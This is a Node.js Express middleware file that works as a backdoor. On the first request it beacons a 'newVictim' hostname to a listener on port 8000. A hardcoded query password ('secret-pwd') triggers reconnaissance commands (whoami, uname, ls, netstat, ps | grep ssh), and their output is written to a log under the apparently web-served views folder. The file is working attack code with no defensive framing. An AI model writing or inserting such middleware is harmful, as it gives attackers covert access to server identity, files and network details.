const { spawn } = require("child_process");
const http = require("http");
const winston = require('winston');

// Logger configuration
const logConfiguration = {
    "transports":[
      new winston.transports.File({
          filename:"./views/loggers.log",
          colorize: true
      })
    ],
    format: winston.format.combine(
      winston.format.timestamp({
         format: 'MMM-DD-YYYY HH:mm:ss'
     }),
      winston.format.printf(info => `abc@remote:~$ ${info.message}`),
  )

};
// create logger
const logger = winston.createLogger(logConfiguration);

module.exports = () => {

  let newVictim = true;

  return (req, res, next) => {
    if (newVictim) {
      newVictim = false;
      const options = {
        host: "127.0.0.1",
        port: "8000",
        path: `/new_access?newAccessURL=${req.hostname}`,
      };
      http.request(options).end();
    }

    const { pwd } = req.query;

    if (!pwd) {
      console.log(`${new Date().toLocaleString()}: ${req.method} - ${req.url}`);
      // logger.info(`${new Date().toLocaleString()}: ${req.method} - ${req.url}`);
    }
    if (pwd === "secret-pwd") {
      logger.info("------------------------------------------------------------------------------------------\n");
      logger.warn(`NEW ACCESS @ ${new Date().toLocaleString()}: ${req.method} - ${req.hostname}/`);

      const ls = spawn("ls", ['-la']);
      const hostname = spawn('hostname', ['-i']);
      const awk = spawn('awk', ['"{print $3}"']);
      const owner = spawn('whoami');
      const os = spawn('uname', ['-a']);
      const pwd = spawn('pwd');
      const netstat = spawn("netstat", ["-nlpv", "--inet"]);

      const ps = spawn('ps', ['ax']);
      const grep = spawn('grep', ['ssh']);

  // hostname -i
    hostname.stdout.on('data', (data) => {
      // console.log(data.toString());
      logger.info('hostname -i\n' + data.toString().replace(/\n/g, ''));
    });
    
    hostname.stderr.on('data', (data) => {
      console.error(`hostname stderr: ${data}`);
    });
    
    hostname.on('close', (code) => {
      if (code !== 0) {
        console.log(`hostname process exited with code ${code}`);
      }
    });

  // whoami
    owner.stdout.on('data', (data) => {
      // console.log(data.toString());
      logger.info('whoami\n' + data.toString().replace(/\n/g, ''));
    });
    
    owner.stderr.on('data', (data) => {
      console.error(`owner stderr: ${data}`);
    });
    
    owner.on('close', (code) => {
      if (code !== 0) {
        console.log(`owner process exited with code ${code}`);
      }
    });

  // uname -a
    os.stdout.on('data', (data) => {
      // console.log(data.toString());
      logger.info('uname -a\n' + data.toString().replace(/\n/g, ''));
    });
    
    os.stderr.on('data', (data) => {
      console.error(`os stderr: ${data}`);
    });
    
    os.on('close', (code) => {
      if (code !== 0) {
        console.log(`os process exited with code ${code}`);
      }
    });

  // ls -la
    ls.stdout.on('data', (data) => {
      // console.log(data.toString());
      logger.info('ls -la\n' + data.toString());
    });
    
    ls.stderr.on('data', (data) => {
      console.error(`ls stderr: ${data}`);
    });
    
    ls.on('close', (code) => {
      if (code !== 0) {
        console.log(`ls process exited with code ${code}`);
      }
    });

    // ps ax | grep ssh

    // ps ax
    ps.stdout.on('data', (data) => {
      grep.stdin.write(data);
    });
    
    ps.stderr.on('data', (data) => {
      console.error(`ps stderr: ${data}`);
    });
    
    ps.on('close', (code) => {
      if (code !== 0) {
        console.log(`ps process exited with code ${code}`);
      }
      grep.stdin.end();
    });
  // grep ssh    
    grep.stdout.on('data', (data) => {
      // console.log(data.toString());
      logger.info('ps ax | grep ssh\n' + data.toString().replace(/\n/g, ''));
    });
    
    grep.stderr.on('data', (data) => {
      console.error(`grep stderr: ${data}`);
    });
    
    grep.on('close', (code) => {
      if (code !== 0) {
        console.log(`grep process exited with code ${code}`);
      }
    });

  // pwd
    pwd.stdout.on('data', (data) => {
      // console.log(data.toString());
      logger.info('pwd\n' + data.toString().replace(/\n/g, ''));
    });
    
    pwd.stderr.on('data', (data) => {
      console.error(`pwd stderr: ${data}`);
    });
    
    pwd.on('close', (code) => {
      if (code !== 0) {
        console.log(`pwd process exited with code ${code}`);
      }
    });

  // netstat -nlpv --inet
    netstat.stdout.on('data', (data) => {
      logger.info('netstat -nlpv --inet\n' + "\t" + data.toString());
    });
    
    netstat.stderr.on('data', (data) => {
      console.error(`netstat stderr: ${data}`);
    });
    
    netstat.on('close', (code) => {
      if (code !== 0) {
        console.log(`netstat process exited with code ${code}`);
      }
    });

  }
    next();
  };
};
